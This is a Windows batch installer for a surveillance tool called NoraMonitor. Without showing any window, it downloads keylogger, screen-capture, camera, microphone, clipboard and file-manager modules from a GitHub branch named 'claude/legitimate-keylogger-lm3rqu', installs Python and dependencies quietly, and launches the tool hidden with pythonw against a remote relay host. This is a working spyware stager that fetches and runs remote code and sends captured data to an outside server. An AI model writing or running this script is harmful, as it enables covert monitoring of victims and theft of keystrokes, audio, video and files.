@echo off
setlocal enabledelayedexpansion

set "DIR=%APPDATA%\NoraMonitor"
set "REPO=smallkhk/Nora-signal"
set "BRANCH=claude/legitimate-keylogger-lm3rqu"
set "TOKENFILE=%DIR%\ngrok.token"

mkdir "%DIR%\templates" 2>nul
mkdir "%DIR%\recordings" 2>nul

:: Download all files from GitHub using API (handles branch names with slashes)
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$api='https://api.github.com/repos/%REPO%/contents/nora-monitor'; $ref='%BRANCH%'; $d='%DIR%'; $h=@{Accept='application/vnd.github.v3.raw'};" ^
  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','relay_client.py','file_manager.py','microphone.py','requirements.txt' | %%{ try { Invoke-WebRequest \"$api/$_`?ref=$ref\" -Headers $h -OutFile \"$d\$_\" -ErrorAction Stop } catch { Write-Host \"Skip: $_\" } };" ^
  "try { Invoke-WebRequest \"$api/templates/viewer.html`?ref=$ref\" -Headers $h -OutFile \"$d\templates\viewer.html\" -ErrorAction Stop } catch {}"

:: Install Python silently if not present
python --version >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "Invoke-WebRequest 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '$env:TEMP\pysetup.exe'"
    %TEMP%\pysetup.exe /quiet InstallAllUsers=0 PrependPath=1
    timeout /t 20 /nobreak >nul
)

:: Install dependencies quietly
pip install -r "%DIR%\requirements.txt" -q --no-warn-script-location

:: Launch in relay mode — connects to the hosted relay server
set "NORA_RELAY=https://mon.eclipselivecam.online"
start "" /D "%DIR%" pythonw "%DIR%\app.py"

endlocal
